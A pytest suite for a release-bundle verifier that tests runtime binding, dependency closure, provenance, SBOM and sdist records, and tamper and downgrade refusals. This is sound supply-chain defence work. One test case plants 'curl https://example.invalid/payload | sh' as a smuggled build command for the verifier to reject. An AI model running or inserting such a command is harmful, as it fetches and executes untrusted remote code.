from __future__ import annotations

import hashlib
import json
import shutil
import subprocess
from pathlib import Path

import pytest

from distribution.bundle import BundleBuilder, BundleVerificationError, verify_bundle

from conftest import PYTHON_RUNTIME_PIN_RELATIVE, REPOSITORY, make_wheel
from test_bundle import _rewrite_outer_checksums

WEB_LOCK_SHA256 = "5" * 64


def _digest(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _requirements(
    wheels: tuple[Path, ...],
    *,
    pinned: dict[str, str] | None = None,
) -> str:
    """One uv-export-shaped, hash-pinned line per shipped dependency wheel.

    `pinned` overrides the digest for a distribution whose lock line does not
    pin a wheel at all — the contract §10 A14 case, where the export pins only
    an sdist because the index publishes no wheel for that name.
    """

    overrides = pinned or {}
    lines: list[str] = []
    for wheel in sorted(wheels, key=lambda item: item.name):
        name, version = wheel.name.split("-")[:2]
        distribution = name.replace("_", "-")
        lines.append(f"{distribution}=={version} \\")
        lines.append(f"    --hash=sha256:{overrides.get(distribution, _digest(wheel))}")
    return "\n".join(lines) + "\n"


def _workspace_wheels(directory: Path) -> tuple[Path, ...]:
    """The workspace roots a schema-3 bundle must carry, in miniature.

    One wheel per name in `distribution.bundle._WORKSPACE_DISTRIBUTIONS`: the
    closure proof takes exactly those names as its roots, so a fixture that
    named a different set would prove nothing about the product's own bundle.
    """

    return (
        make_wheel(
            directory,
            "cortex",
            "1.0.0",
            "cortex_platform",
            requires=(
                "cortex-research==1.0.0",
                "httpx>=0.28.0",
            ),
            requires_python=">=3.11",
        ),
        make_wheel(
            directory,
            "cortex-research",
            "1.0.0",
            "cortex_research",
            requires=("sqlite-vec==0.1.9",),
            requires_python=">=3.11",
        ),
    )


def _dependency_wheels(directory: Path) -> tuple[Path, ...]:
    return (
        make_wheel(
            directory, "httpx", "0.28.1", "httpx", requires=("anyio>=4.0",), requires_python=">=3.9"
        ),
        make_wheel(directory, "anyio", "4.9.0", "anyio", requires_python=">=3.9"),
        make_wheel(
            directory,
            "sqlite-vec",
            "0.1.9",
            "sqlite_vec",
            requires_python=">=3.9",
            platform_tag="macosx_11_0_arm64",
        ),
    )


class _Inputs:
    def __init__(self, tmp_path: Path, archive: Path, pin: dict[str, object]) -> None:
        self.root = tmp_path / "schema3-inputs"
        self.root.mkdir(parents=True)
        self.workspace = _workspace_wheels(self.root)
        self.dependencies = _dependency_wheels(self.root)
        self.requirements = self.root / "requirements.txt"
        self.requirements.write_text(_requirements(self.dependencies))
        self.archive = archive
        self.pin = pin


@pytest.fixture
def schema3_inputs(
    tmp_path: Path,
    embedded_python_runtime: Path,
    embedded_python_pin: dict[str, object],
) -> _Inputs:
    return _Inputs(tmp_path, embedded_python_runtime, embedded_python_pin)


def _assemble(
    output: Path,
    inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    *,
    workspace: tuple[Path, ...] | None = None,
    dependencies: tuple[Path, ...] | None = None,
    requirements: Path | None = None,
    sdist_builds: dict[str, dict[str, str]] | None = None,
) -> Path:
    web_root, web_ledger = web_closure
    return BundleBuilder(output).assemble(
        release_id="cortex-dev-3",
        release_sequence=3,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=workspace if workspace is not None else inputs.workspace,
        created_at="2026-07-30T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
        python_runtime_archive=inputs.archive,
        python_runtime_pin=inputs.pin,
        requirements=requirements if requirements is not None else inputs.requirements,
        dependency_wheels=(
            dependencies if dependencies is not None else inputs.dependencies
        ),
        sdist_builds=sdist_builds,
    ).path


def test_schema3_binds_the_embedded_interpreter_and_full_closure(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)

    verified = verify_bundle(bundle, node_executable=analyser_node)

    manifest = verified.manifest
    assert manifest["schema_version"] == 3
    assert manifest["dependency_closure"] == "complete"
    assert manifest["python"] == {
        "implementation": "CPython",
        "major": 3,
        "minor": 14,
        "embedded": True,
    }
    runtime = manifest["python_runtime"]
    archive_relative = runtime["path"]
    assert archive_relative.startswith("artifacts/python/")
    assert runtime["sha256"] == _digest(bundle / archive_relative)
    assert runtime["size"] == (bundle / archive_relative).stat().st_size
    assert runtime["abi_tag"] == "cp314"
    assert runtime["version"] == "3.14.6"
    assert runtime["policy"]["host_interpreter_required"] is False
    roles = {entry["name"]: entry["role"] for entry in manifest["artifacts"]}
    assert roles["cortex"] == "cortex-wheel"
    assert roles["cortex-research"] == "profile-wheel"
    assert roles["httpx"] == "dependency-wheel"
    assert all("abi_tag" in entry for entry in manifest["artifacts"])
    assert (bundle / "artifacts" / "requirements.txt").is_file()
    assert len(list((bundle / "artifacts" / "python").iterdir())) == 1


def test_schema3_verification_ignores_the_verifying_host_python_version(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The direct proof that the host dropped out of the statement."""

    import distribution.bundle as bundle_module

    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    monkeypatch.setattr(
        bundle_module.platform, "python_version_tuple", lambda: ("3", "9", "0")
    )
    monkeypatch.setattr(bundle_module.platform, "python_implementation", lambda: "CPython")

    verified = verify_bundle(bundle, node_executable=analyser_node)

    assert verified.manifest["schema_version"] == 3


def test_schema3_rejects_a_wheel_whose_abi_tag_does_not_match_the_interpreter(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    incompatible = make_wheel(
        schema3_inputs.root,
        "anyio",
        "4.9.0",
        "anyio",
        requires_python=">=3.9",
        python_tag="cp313",
        abi_tag="cp313",
        platform_tag="macosx_11_0_arm64",
    )
    dependencies = tuple(
        incompatible if wheel.name.startswith("anyio") else wheel
        for wheel in schema3_inputs.dependencies
    )
    requirements = schema3_inputs.root / "incompatible.txt"
    requirements.write_text(_requirements(dependencies))

    with pytest.raises(BundleVerificationError, match="ABI|tag"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            dependencies=dependencies,
            requirements=requirements,
        )


def test_schema3_rejects_a_wheel_platform_tag_beyond_the_supported_macos_major(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    beyond = make_wheel(
        schema3_inputs.root,
        "sqlite-vec",
        "0.1.9",
        "sqlite_vec",
        requires_python=">=3.9",
        platform_tag="macosx_27_0_arm64",
    )
    dependencies = tuple(
        beyond if wheel.name.startswith("sqlite_vec") else wheel
        for wheel in schema3_inputs.dependencies
    )
    requirements = schema3_inputs.root / "beyond.txt"
    requirements.write_text(_requirements(dependencies))

    with pytest.raises(BundleVerificationError, match="tag"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            dependencies=dependencies,
            requirements=requirements,
        )


def test_schema3_rejects_a_manifest_python_that_disagrees_with_the_runtime_version(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["python"]["minor"] = 13
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_rejects_a_missing_transitive_dependency_wheel(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    dependencies = tuple(
        wheel for wheel in schema3_inputs.dependencies if not wheel.name.startswith("anyio")
    )
    requirements = schema3_inputs.root / "missing.txt"
    requirements.write_text(_requirements(dependencies))

    with pytest.raises(BundleVerificationError, match="closure|dependency"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            dependencies=dependencies,
            requirements=requirements,
        )


def test_schema3_rejects_an_unreachable_smuggled_wheel(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    smuggled = make_wheel(
        schema3_inputs.root, "unreachable-payload", "9.9.9", "unreachable", requires_python=">=3.9"
    )
    dependencies = (*schema3_inputs.dependencies, smuggled)
    requirements = schema3_inputs.root / "smuggled.txt"
    requirements.write_text(_requirements(dependencies))

    with pytest.raises(BundleVerificationError, match="closure|unreachable"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            dependencies=dependencies,
            requirements=requirements,
        )


def test_schema3_rejects_a_forbidden_agpl_distribution(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    forbidden = make_wheel(
        schema3_inputs.root, "backtesting", "0.6.4", "backtesting", requires_python=">=3.9"
    )
    dependencies = (*schema3_inputs.dependencies, forbidden)
    requirements = schema3_inputs.root / "forbidden.txt"
    requirements.write_text(_requirements(dependencies))

    with pytest.raises(BundleVerificationError, match="license|forbidden"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            dependencies=dependencies,
            requirements=requirements,
        )


def test_schema3_rejects_requirements_hashes_that_disagree_with_the_wheels(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    requirements = bundle / "artifacts" / "requirements.txt"
    requirements.write_text(requirements.read_text().replace("--hash=sha256:", "--hash=sha256:0"))
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_rejects_capabilities_that_do_not_match_the_artifacts(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    assert manifest["capabilities"]["sqlite_vec"] is True
    manifest["capabilities"]["ocr"] = True
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="capabilit"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_rejects_a_python_runtime_archive_that_was_replaced(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    archive = next((bundle / "artifacts" / "python").iterdir())
    archive.write_bytes(archive.read_bytes() + b"tampered")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_rejects_a_second_file_under_artifacts_python(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    (bundle / "artifacts" / "python" / "extra.tar.gz").write_bytes(b"second archive")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_cannot_be_downgraded_to_schema2(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["schema_version"] = 2
    del manifest["python_runtime"]
    manifest["python"]["embedded"] = False
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="must not carry an embedded Python runtime"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_the_downgrade_refusal_does_not_depend_on_the_verifying_host(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A forged downgrade must blame the manifest, not the operator's Python.

    The schema-1/2 branch of the Python binding check compares the manifest
    against the verifying host, so whichever of the two refusals runs first
    decides what the operator is told. Running the suite under a 3.13 host is
    what exposed this: the downgrade was still refused, but for a reason that
    pointed at the host inside the one feature whose point is that the host has
    dropped out of the statement.
    """

    import distribution.bundle as bundle_module

    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["schema_version"] = 2
    del manifest["python_runtime"]
    manifest["python"]["embedded"] = False
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)
    monkeypatch.setattr(bundle_module.platform, "python_version_tuple", lambda: ("3", "9", "0"))
    monkeypatch.setattr(bundle_module.platform, "python_implementation", lambda: "CPython")

    with pytest.raises(BundleVerificationError, match="must not carry an embedded Python runtime"):
        verify_bundle(bundle, node_executable=analyser_node)


@pytest.mark.parametrize("field", ["python_tag", "abi_tag", "platform_tag"])
def test_an_artifact_missing_a_tag_field_is_refused_rather_than_crashing(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    field: str,
) -> None:
    """`_validate_python_binding` indexes tag fields behind only a role guard.

    Run before the closed-schema artifact loop, it raised a bare `KeyError` out
    of `verify_bundle` for a manifest missing any of these — a crash where the
    contract requires a refusal (§10 A15). The three fields are parametrized
    because only these three are read ahead of the loop.
    """

    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    del manifest["artifacts"][0][field]
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="artifact schema is not closed"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_provenance_sdist_built_is_re_derived_and_not_echoed_back(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """The verify-side derivation must read the record, not the claim.

    Compose and verify derive `sdist_built` independently and compare by
    equality; that hand-duplication buys nothing unless a provenance file
    disagreeing with the shipped record is refused.
    """

    requirements, record = _sdist_closure(schema3_inputs)
    bundle = _assemble(
        tmp_path / "bundle",
        schema3_inputs,
        web_closure,
        analyser_node,
        requirements=requirements,
        sdist_builds=record,
    )
    provenance_path = bundle / "provenance-inputs.json"
    provenance = json.loads(provenance_path.read_text())
    assert provenance["dependency_inputs"]["sdist_built"] == [SDIST_DISTRIBUTION]
    provenance["dependency_inputs"]["sdist_built"] = []
    provenance_path.write_text(json.dumps(provenance, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="supply-chain metadata is invalid"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_legacy_schema_rejects_a_smuggled_python_runtime_archive(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-30T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    smuggled = bundle / "artifacts" / "python"
    smuggled.mkdir(parents=True)
    shutil.copyfile(schema3_inputs.archive, smuggled / schema3_inputs.archive.name)
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="must not carry an embedded Python runtime"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_sbom_and_provenance_cover_the_runtime_and_the_closure(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)

    verified = verify_bundle(bundle, node_executable=analyser_node)

    sbom = verified.sbom
    assert sbom["version"] == 3
    components = {component["name"]: component for component in sbom["components"]}
    embedded = components["cpython-embedded"]
    assert embedded["version"] == "3.14.6"
    assert embedded["hashes"][0]["content"] == verified.manifest["python_runtime"]["sha256"]
    requirements = components["cortex-dependency-requirements"]
    assert requirements["hashes"][0]["content"] == _digest(
        bundle / "artifacts" / "requirements.txt"
    )
    assert "httpx" in components
    provenance = verified.provenance
    assert provenance["schema_version"] == 3
    assert provenance["python_runtime_inputs"]["release_tag"] == "20260728"
    assert provenance["dependency_inputs"]["wheel_count"] == len(schema3_inputs.dependencies)
    assert provenance["dependency_inputs"]["sdist_built"] == []
    assert any("uv export" in command for command in provenance["build_commands"])
    assert provenance["signed"] is False
    assert provenance["reproducible_build_proven"] is False


# ---------------------------------------------------------------------------
# Cross-generation upgrade — a predecessor built from a wider workspace
# ---------------------------------------------------------------------------

# The real case this section exists for: gen18 was composed from a four-member
# workspace and records five build commands; the research-only verifier derives
# three. `build_commands` is the one provenance field derived from the VERIFIER's
# `_WORKSPACE_DISTRIBUTIONS` rather than from the bundle, so without an
# installed-generation exemption no candidate built from the narrowed workspace
# can ever be upgraded over a generation built from the wider one.
RETIRED_MEMBER = "cortex-legacy"
EXPORT_COMMAND = (
    "uv export --frozen --offline --no-dev --no-emit-workspace --format requirements-txt"
)


def _wider_workspace(directory: Path) -> tuple[Path, ...]:
    """The fixture workspace with one member this verifier no longer builds.

    Modelled on the real gen18 bundle, where `cortex` requires every profile in
    the composition: a member dropped from `_WORKSPACE_DISTRIBUTIONS` is still
    reachable from the narrowed roots, so the closure proof is unaffected and
    the recorded `build_commands` are the only thing that diverges.
    """

    return (
        make_wheel(
            directory,
            "cortex",
            "1.0.0",
            "cortex_platform",
            requires=(
                "cortex-research==1.0.0",
                f"{RETIRED_MEMBER}==1.0.0",
                "httpx>=0.28.0",
            ),
            requires_python=">=3.11",
        ),
        make_wheel(
            directory,
            "cortex-research",
            "1.0.0",
            "cortex_research",
            requires=("sqlite-vec==0.1.9",),
            requires_python=">=3.11",
        ),
        make_wheel(
            directory,
            RETIRED_MEMBER,
            "1.0.0",
            "cortex_legacy",
            requires_python=">=3.11",
        ),
    )


def _predecessor_bundle(
    tmp_path: Path,
    inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> Path:
    """Compose a bundle from a workspace wider than this verifier's.

    Both the builder's required-member check and `_build_commands` read the
    module constant at call time, so composing under the wider tuple produces a
    bundle that records its own composition. The patch is undone before the
    bundle is verified: the verifier must be the narrowed one, exactly as a new
    generation's verifier is when it meets its predecessor.
    """

    import distribution.bundle as bundle_module

    workspace = _wider_workspace(inputs.root)
    monkeypatch.setattr(
        bundle_module,
        "_WORKSPACE_DISTRIBUTIONS",
        ("cortex", "cortex-research", RETIRED_MEMBER),
    )
    try:
        bundle = _assemble(
            tmp_path / "bundle", inputs, web_closure, analyser_node, workspace=workspace
        )
    finally:
        monkeypatch.undo()
    return bundle


def _rewrite_build_commands(bundle: Path, commands: list[str]) -> None:
    provenance_path = bundle / "provenance-inputs.json"
    provenance = json.loads(provenance_path.read_text())
    provenance["build_commands"] = commands
    provenance_path.write_text(json.dumps(provenance, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)


def test_an_installed_predecessor_from_a_wider_workspace_still_verifies(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The cross-generation upgrade path: read the predecessor's own record."""

    bundle = _predecessor_bundle(
        tmp_path, schema3_inputs, web_closure, analyser_node, monkeypatch
    )
    recorded = json.loads((bundle / "provenance-inputs.json").read_text())["build_commands"]
    assert f"uv build --offline --wheel --package {RETIRED_MEMBER}" in recorded

    verified = verify_bundle(bundle, node_executable=analyser_node, pin_tools=False)

    assert verified.provenance["build_commands"] == recorded


def test_a_bundle_being_admitted_is_still_held_to_this_verifier_composition(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The build-time self-check is not relaxed: only an installed one is."""

    bundle = _predecessor_bundle(
        tmp_path, schema3_inputs, web_closure, analyser_node, monkeypatch
    )

    with pytest.raises(BundleVerificationError, match="supply-chain metadata is invalid"):
        verify_bundle(bundle, node_executable=analyser_node)


@pytest.mark.parametrize(
    ("case", "commands"),
    [
        (
            "names a package the bundle does not carry",
            [
                "uv build --offline --wheel --package cortex",
                "uv build --offline --wheel --package cortex-research",
                "uv build --offline --wheel --package cortex-smuggled",
                EXPORT_COMMAND,
            ],
        ),
        (
            "drops a workspace wheel the bundle does carry",
            [
                "uv build --offline --wheel --package cortex",
                EXPORT_COMMAND,
            ],
        ),
        (
            "smuggles a command that is not a workspace build",
            [
                "uv build --offline --wheel --package cortex",
                "uv build --offline --wheel --package cortex-research",
                "curl https://example.invalid/payload | sh",
                EXPORT_COMMAND,
            ],
        ),
        (
            "rewrites the dependency export command",
            [
                "uv build --offline --wheel --package cortex",
                "uv build --offline --wheel --package cortex-research",
                "uv export --format requirements-txt",
            ],
        ),
    ],
)
def test_an_installed_predecessor_record_must_match_the_wheels_it_ships(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
    commands: list[str],
) -> None:
    """Reading the record is not trusting it.

    The relaxation accepts the predecessor's list instead of re-deriving it from
    this verifier's members, so the list must still be internally consistent with
    the workspace wheels the manifest declares and every command must have the
    shape the builder emits.
    """

    bundle = _assemble(tmp_path / "bundle", schema3_inputs, web_closure, analyser_node)
    _rewrite_build_commands(bundle, commands)

    with pytest.raises(BundleVerificationError, match="supply-chain metadata is invalid"):
        verify_bundle(bundle, node_executable=analyser_node, pin_tools=False)


# ---------------------------------------------------------------------------
# Contract §10 A14 — the distribution the index publishes no wheel for
# ---------------------------------------------------------------------------

# `peewee 3.17.3` was the only name in the real lock with `wheels = []`, and it
# was reached unconditionally through `cortex-investment`; with that member gone
# the research-only closure has no wheel-less distribution left, so the real lock
# no longer exercises this path at all. The mechanism stays and is proven here
# instead: `anyio` stands in as a leaf of the fixture closure, exactly as peewee
# was a leaf of the real one. A bundle that ships an unexplained wheel must keep
# failing closed whether or not this product's own closure happens to need it.
SDIST_BYTES = b"anyio sdist bytes, exactly as the lock pins them"
SDIST_DISTRIBUTION = "anyio"


def _sdist_closure(inputs: _Inputs) -> tuple[Path, dict[str, dict[str, str]]]:
    """A closure whose lock line for one distribution pins only an sdist.

    The wheel beside it can then be explained by nothing except the side record
    `tools/vendor_wheelhouse.py` writes, which is precisely the state a real
    `uv export` produces for a wheel-less distribution.
    """

    wheel = next(
        path for path in inputs.dependencies if path.name.startswith(f"{SDIST_DISTRIBUTION}-")
    )
    sdist_digest = hashlib.sha256(SDIST_BYTES).hexdigest()
    requirements = inputs.root / "sdist.requirements.txt"
    requirements.write_text(
        _requirements(inputs.dependencies, pinned={SDIST_DISTRIBUTION: sdist_digest})
    )
    record = {
        SDIST_DISTRIBUTION: {"sdist_sha256": sdist_digest, "wheel_sha256": _digest(wheel)}
    }
    return requirements, record


def _rewrite_sdist_record(bundle: Path, record: object) -> None:
    (bundle / "artifacts" / "sdist-builds.json").write_text(
        json.dumps(record, sort_keys=True, separators=(",", ":")) + "\n"
    )
    _rewrite_outer_checksums(bundle)


def test_schema3_accepts_a_dependency_wheel_built_from_its_pinned_sdist(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """The A14 accept path: the lock binds the input, the record binds it here."""

    requirements, record = _sdist_closure(schema3_inputs)

    bundle = _assemble(
        tmp_path / "bundle",
        schema3_inputs,
        web_closure,
        analyser_node,
        requirements=requirements,
        sdist_builds=record,
    )

    verified = verify_bundle(bundle, node_executable=analyser_node)
    assert verified.manifest["schema_version"] == 3
    assert verified.manifest["dependency_closure"] == "complete"
    assert json.loads((bundle / "artifacts" / "sdist-builds.json").read_text()) == record
    # The bundle says out loud which of its wheels it derived itself.
    assert verified.provenance["dependency_inputs"]["sdist_built"] == [SDIST_DISTRIBUTION]


def test_schema3_rejects_the_same_wheel_when_no_sdist_record_explains_it(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """The fail-closed baseline the accept path above is measured against.

    Without this, that test would pass for a wheel the lock never pinned and
    prove nothing about the record.
    """

    requirements, _record = _sdist_closure(schema3_inputs)

    with pytest.raises(BundleVerificationError, match="closures disagree"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            requirements=requirements,
        )


def test_schema3_rejects_an_sdist_record_citing_a_digest_the_lock_does_not_pin(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    requirements, record = _sdist_closure(schema3_inputs)
    forged = {
        SDIST_DISTRIBUTION: {
            "sdist_sha256": "0" * 64,
            "wheel_sha256": record[SDIST_DISTRIBUTION]["wheel_sha256"],
        }
    }

    with pytest.raises(BundleVerificationError, match="unpinned sdist"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            requirements=requirements,
            sdist_builds=forged,
        )


def test_schema3_rejects_an_sdist_record_that_describes_a_different_wheel(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """A record excuses the wheel it names, not whatever wheel is shipped."""

    requirements, record = _sdist_closure(schema3_inputs)
    forged = {
        SDIST_DISTRIBUTION: {
            "sdist_sha256": record[SDIST_DISTRIBUTION]["sdist_sha256"],
            "wheel_sha256": "1" * 64,
        }
    }

    with pytest.raises(BundleVerificationError, match="does not describe the shipped wheel"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            requirements=requirements,
            sdist_builds=forged,
        )


@pytest.mark.parametrize(
    "entry",
    [
        {"sdist_sha256": "2" * 64},
        {"wheel_sha256": "2" * 64},
        {"sdist_sha256": "2" * 64, "wheel_sha256": "3" * 64, "note": "extra"},
    ],
    ids=["missing-wheel", "missing-sdist", "surplus-field"],
)
def test_schema3_rejects_an_sdist_record_whose_schema_is_not_closed(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    entry: dict[str, str],
) -> None:
    requirements, _record = _sdist_closure(schema3_inputs)

    with pytest.raises(BundleVerificationError, match="schema is not closed"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            requirements=requirements,
            sdist_builds={SDIST_DISTRIBUTION: entry},
        )


def test_schema3_refuses_rather_than_crashes_on_an_unparsable_record_name(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """The record is read outside the closure proof's own error handler.

    `normalize_name` raises `WheelClosureError`, which nothing above this call
    catches, so an unsupported name would leave `verify_bundle` as a crash
    instead of a refusal — the failure class contract §10 A15 names.
    """

    requirements, record = _sdist_closure(schema3_inputs)

    with pytest.raises(BundleVerificationError, match="sdist build record is invalid"):
        _assemble(
            tmp_path / "bundle",
            schema3_inputs,
            web_closure,
            analyser_node,
            requirements=requirements,
            sdist_builds={"not a distribution name!": record[SDIST_DISTRIBUTION]},
        )


def test_schema3_rejects_an_sdist_record_emptied_after_composition(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """No sdist builds is the file's absence, not a present-but-empty file."""

    requirements, record = _sdist_closure(schema3_inputs)
    bundle = _assemble(
        tmp_path / "bundle",
        schema3_inputs,
        web_closure,
        analyser_node,
        requirements=requirements,
        sdist_builds=record,
    )
    _rewrite_sdist_record(bundle, {})

    with pytest.raises(BundleVerificationError, match="sdist build record is empty"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema3_rejects_an_sdist_record_deleted_after_composition(
    tmp_path: Path,
    schema3_inputs: _Inputs,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """Dropping the record must not silently re-admit the wheel it explained."""

    requirements, record = _sdist_closure(schema3_inputs)
    bundle = _assemble(
        tmp_path / "bundle",
        schema3_inputs,
        web_closure,
        analyser_node,
        requirements=requirements,
        sdist_builds=record,
    )
    (bundle / "artifacts" / "sdist-builds.json").unlink()
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="closures disagree"):
        verify_bundle(bundle, node_executable=analyser_node)


